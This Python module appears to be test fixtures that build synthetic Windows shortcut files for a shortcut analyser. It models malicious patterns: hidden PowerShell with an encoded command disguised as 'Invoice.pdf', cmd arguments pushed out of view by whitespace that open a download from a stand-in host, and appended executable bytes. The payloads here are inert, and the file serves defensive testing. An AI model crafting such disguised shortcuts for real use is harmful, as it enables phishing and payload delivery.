"""Synthetic Windows shortcut (MS-SHLLINK) fixtures. The command lines are inert text;
the encoded PowerShell decodes to `Write-Host fixture`."""

from __future__ import annotations

import base64
import struct
import uuid

LINK_CLSID = bytes.fromhex("0114020000000000C000000000000046")
HAS_LINK_INFO = 0x02
HAS_NAME = 0x04
HAS_RELATIVE_PATH = 0x08
HAS_WORKING_DIR = 0x10
HAS_ARGUMENTS = 0x20
HAS_ICON_LOCATION = 0x40
IS_UNICODE = 0x80
SW_SHOWNORMAL, SW_SHOWMINNOACTIVE = 1, 7

ENCODED_FIXTURE = base64.b64encode("Write-Host fixture".encode("utf-16-le")).decode()


def _string(text: str) -> bytes:
    return struct.pack("<H", len(text)) + text.encode("utf-16-le")


def _link_info(local_path: str) -> bytes:
    volume = struct.pack("<IIII", 0x11, 3, 0x1234ABCD, 0x10) + b"\0"
    header_size = 0x1C
    volume_off = header_size
    path_off = volume_off + len(volume)
    path = local_path.encode("latin-1") + b"\0"
    suffix_off = path_off + len(path)
    total = suffix_off + 1
    return struct.pack("<IIIIIII", total, header_size, 1, volume_off, path_off, 0,
                       suffix_off) + volume + path + b"\0"


def _tracker(machine: str, mac: str) -> bytes:
    node = int(mac.replace(":", ""), 16)
    file_id = uuid.UUID(fields=(0x12345678, 0x1234, 0x11EF, 0x80, 0x01, node)).bytes_le
    volume_id = uuid.UUID("0f0e0d0c-0b0a-0908-0706-050403020100").bytes_le
    droid = volume_id + file_id
    body = struct.pack("<II", 0x58, 0) + machine.encode().ljust(16, b"\0") + droid + droid
    return struct.pack("<II", 0x60, 0xA0000003) + body


def build_lnk(
    target: str,
    arguments: str | None = None,
    working_dir: str | None = None,
    icon: str | None = None,
    description: str | None = None,
    show: int = SW_SHOWNORMAL,
    machine: str | None = "fixture-pc",
    mac: str = "00:00:5e:00:53:01",  # RFC 7042 documentation MAC
    appended: bytes = b"",
) -> bytes:
    flags = HAS_LINK_INFO | IS_UNICODE
    strings = b""
    if description is not None:
        flags |= HAS_NAME
        strings += _string(description)
    if working_dir is not None:
        flags |= HAS_WORKING_DIR
        strings += _string(working_dir)
    if arguments is not None:
        flags |= HAS_ARGUMENTS
        strings += _string(arguments)
    if icon is not None:
        flags |= HAS_ICON_LOCATION
        strings += _string(icon)
    header = struct.pack("<I16sIIQQQIiIHHII", 0x4C, LINK_CLSID, flags, 0x20, 0, 0, 0, 0, 0,
                         show, 0, 0, 0, 0)
    extra = (_tracker(machine, mac) if machine else b"") + b"\0\0\0\0"
    return header + _link_info(target) + strings + extra + appended


POWERSHELL = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"


def benign_notepad() -> bytes:
    return build_lnk("C:\\Windows\\System32\\notepad.exe", working_dir="C:\\Users\\Public",
                     description="Notepad")


def encoded_powershell() -> bytes:
    return build_lnk(
        POWERSHELL,
        arguments=f"-NoProfile -WindowStyle Hidden -EncodedCommand {ENCODED_FIXTURE}",
        icon="C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe",
        description="Invoice.pdf",
        show=SW_SHOWMINNOACTIVE,
    )


def padded_cmd() -> bytes:
    return build_lnk(
        "C:\\Windows\\System32\\cmd.exe",
        arguments=" " * 300 + "/c echo fixture & start http://download.example.com/a.bin",
        icon="%SystemRoot%\\System32\\imageres.dll",
    )


def with_appended_data() -> bytes:
    return build_lnk("C:\\Windows\\System32\\notepad.exe", appended=b"MZ" + bytes(200))


HAS_EXP_STRING = 0x200
HAS_DARWIN_ID = 0x1000


def _path_block(signature: int, text: str) -> bytes:
    """EnvironmentVariableDataBlock / DarwinDataBlock: 260-byte ANSI + 520-byte Unicode."""
    return (struct.pack("<II", 0x314, signature) + text.encode("latin-1").ljust(260, b"\0")
            + text.encode("utf-16-le").ljust(520, b"\0"))


def target_in_block(signature: int, text: str) -> bytes:
    """A shortcut with no LinkInfo, as Windows writes for Start-menu entries."""
    flags = IS_UNICODE | (HAS_EXP_STRING if signature == 0xA0000001 else HAS_DARWIN_ID)
    header = struct.pack("<I16sIIQQQIiIHHII", 0x4C, LINK_CLSID, flags, 0x20, 0, 0, 0, 0, 0,
                         SW_SHOWNORMAL, 0, 0, 0, 0)
    return header + _path_block(signature, text) + b"\0\0\0\0"
